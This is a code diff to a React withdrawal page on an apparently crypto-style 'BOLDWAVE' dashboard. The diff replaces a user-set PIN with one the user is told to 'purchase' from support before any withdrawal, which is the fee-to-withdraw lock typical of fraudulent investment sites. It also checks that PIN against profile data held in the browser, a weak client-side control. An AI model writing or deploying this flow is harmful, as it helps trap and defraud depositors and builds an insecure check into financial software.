@@ -9,10 +9,8 @@ import { AlertCircle, CheckCircle2, Clock3, ShieldCheck } from 'lucide-react'
 import { useAuth } from '@/hooks/use-auth'
 import { fireAlert } from '@/lib/alerts'
 import { formatCurrency, formatDate } from '@/lib/formatters'
-import { createWithdrawalRequest, subscribeToWallets, subscribeToWithdrawals } from '@/lib/firebase/firestore'
+import { createWithdrawalRequest, logUserActivity, subscribeToWallets, subscribeToWithdrawals } from '@/lib/firebase/firestore'
 import type { WalletRecord, WithdrawalRequest } from '@/lib/firebase/types'
-
-const PIN_KEY = 'BOLDWAVE-dashboard-pin'
 
 const NETWORK_FEE = 8
 
@@ -62,20 +60,29 @@ export default function WithdrawPage() {
       return
     }
 
-    const storedPin = typeof window !== 'undefined' ? localStorage.getItem(PIN_KEY) : null
-    if (!storedPin) {
-      await fireAlert({ title: 'Withdrawal PIN required', text: 'You must set a 4-digit security PIN before withdrawing. Go to Settings to configure your PIN.', icon: 'warning', confirmButtonText: 'OK' })
+    if (!profile?.withdrawalPin) {
+      await fireAlert({ 
+        title: 'Withdrawal PIN required', 
+        text: 'Please go to the support page or contact any of our team to purchase the unique withdrawal PIN for your account.', 
+        icon: 'warning', 
+        confirmButtonText: 'Contact Support',
+        showCancelButton: true
+      }).then((result) => {
+        if (result.isConfirmed) {
+          window.location.href = '/dashboard/support'
+        }
+      })
       return
     }
 
     setPinInput('')
     setPinError('')
     setShowPinModal(true)
+    await logUserActivity(user.uid, 'WITHDRAWAL_ATTEMPT', { amount: numericAmount, destination: selectedDestination.address })
   }
 
   async function handlePinConfirm() {
-    const storedPin = typeof window !== 'undefined' ? localStorage.getItem(PIN_KEY) : null
-    if (pinInput !== storedPin) {
+    if (pinInput !== profile?.withdrawalPin) {
       setPinError('Incorrect PIN. Please try again.')
       setPinInput('')
       return
@@ -83,6 +90,7 @@ export default function WithdrawPage() {
     setShowPinModal(false)
     setPinInput('')
     setPinError('')
+    await logUserActivity(user.uid, 'WITHDRAWAL_AUTHORIZED')
     if (!user || !selectedDestination) return
     try {
       setSubmitting(true)
@@ -99,30 +107,30 @@ export default function WithdrawPage() {
   return (
     <>
     {showPinModal && (
-      <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4">
+      <div className="fixed inset-0 z-[100] flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4">
         <div className="w-full max-w-sm rounded-[2rem] border border-slate-700 bg-slate-900 p-8 text-white shadow-2xl">
           <div className="flex items-center gap-3 mb-4">
             <div className="h-10 w-10 rounded-xl bg-emerald-500/10 flex items-center justify-center">
               <ShieldCheck className="h-5 w-5 text-emerald-400" />
             </div>
             <div>
-              <h2 className="text-lg font-black tracking-tight">Confirm Withdrawal</h2>
-              <p className="text-xs text-slate-400">Enter your 4-digit security PIN to proceed</p>
+              <h2 className="text-lg font-black tracking-tight uppercase">Security Auth</h2>
+              <p className="text-xs text-slate-400">Enter your institutional withdrawal PIN</p>
             </div>
           </div>
           <Input
             type="password"
-            maxLength={4}
+            maxLength={6}
             value={pinInput}
             onChange={(e) => { setPinInput(e.target.value.replace(/\D/g, '')); setPinError('') }}
             placeholder="● ● ● ●"
             className="text-center text-2xl tracking-[0.6em] h-16 bg-slate-800 border-slate-600 text-white"
             autoFocus
           />
-          {pinError && <p className="mt-2 text-sm text-rose-400 text-center">{pinError}</p>}
-          <div className="grid grid-cols-2 gap-3 mt-4">
-            <Button variant="outline" className="border-slate-600 text-slate-300 hover:bg-slate-800" onClick={() => { setShowPinModal(false); setPinInput(''); setPinError('') }}>Cancel</Button>
-            <Button className="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black" onClick={handlePinConfirm} disabled={pinInput.length !== 4 || submitting}>{submitting ? 'Processing...' : 'Confirm'}</Button>
+          {pinError && <p className="mt-2 text-sm text-rose-400 text-center font-bold tracking-tight">{pinError}</p>}
+          <div className="grid grid-cols-2 gap-3 mt-8">
+            <Button variant="ghost" className="text-slate-400 hover:text-white" onClick={() => { setShowPinModal(false); setPinInput(''); setPinError('') }}>Cancel</Button>
+            <Button className="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black uppercase tracking-widest h-12 rounded-xl" onClick={handlePinConfirm} disabled={!pinInput || submitting}>{submitting ? 'Authenticating...' : 'Confirm'}</Button>
           </div>
         </div>
       </div>
